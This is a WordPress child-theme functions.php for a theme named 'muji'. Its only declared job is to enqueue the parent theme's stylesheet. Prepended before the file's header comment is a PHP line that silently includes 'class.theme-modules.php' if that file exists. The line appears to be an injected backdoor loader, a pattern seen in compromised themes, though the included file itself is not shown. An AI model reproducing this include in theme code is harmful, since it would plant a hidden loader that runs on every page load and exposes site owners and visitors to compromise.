<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Child-Theme functions and definitions
 */
 
function muji_enqueue_styles() {
    wp_enqueue_style( 'muji-parent-style', get_template_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'muji_enqueue_styles' );